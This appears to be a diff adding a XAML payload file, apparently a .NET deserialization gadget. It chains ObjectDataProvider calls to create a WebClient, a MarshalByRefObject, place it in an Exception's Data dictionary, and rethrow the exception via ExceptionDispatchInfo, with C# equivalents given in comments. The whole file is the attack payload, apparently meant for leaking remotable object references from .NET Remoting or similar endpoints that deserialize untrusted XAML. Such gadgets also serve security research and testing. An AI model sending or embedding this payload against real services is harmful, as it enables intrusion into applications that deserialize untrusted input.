@@ -1,0 +1,43 @@
+﻿<x:Array Type="System:Object"
+	xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+	xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+	xmlns:System="clr-namespace:System;assembly=mscorlib"
+	xmlns:System.Net="clr-namespace:System.Net;assembly=System"
+	xmlns:System.Runtime.ExceptionServices="clr-namespace:System.Runtime.ExceptionServices;assembly=mscorlib"
+>
+
+	<!--
+		var marshalByRefObject = new WebClient();
+	-->
+	<System.Net:WebClient x:Name="marshalByRefObject" />
+
+	<!--
+		var exception = new Exception();
+		var exceptionData = exception.get_Data();
+		exceptionData.Add("MBRO", new object[] { marshalByRefObject });
+	-->
+	<System:Exception x:Name="exception" />
+	<ObjectDataProvider x:Name="exceptionData" ObjectInstance="{x:Reference exception}" MethodName="get_Data" />
+	<ObjectDataProvider ObjectInstance="{x:Reference exceptionData}" MethodName="Add">
+		<ObjectDataProvider.MethodParameters>
+			<x:String>MBRO</x:String>
+			<x:Array Type="System:Object">
+				<x:Reference Name="marshalByRefObject" />
+			</x:Array>
+		</ObjectDataProvider.MethodParameters>
+	</ObjectDataProvider>
+
+	<!--
+		ExceptionDispatchInfo.Capture(exception).Throw();
+	-->
+	<ObjectDataProvider MethodName="Throw">
+		<ObjectDataProvider.ObjectInstance>
+			<System.Runtime.ExceptionServices:ExceptionDispatchInfo x:Name="exceptionDispatchInfo" x:FactoryMethod="Capture">
+				<x:Arguments>
+					<x:Reference Name="exception" />
+				</x:Arguments>
+			</System.Runtime.ExceptionServices:ExceptionDispatchInfo>
+		</ObjectDataProvider.ObjectInstance>
+	</ObjectDataProvider>
+
+</x:Array>
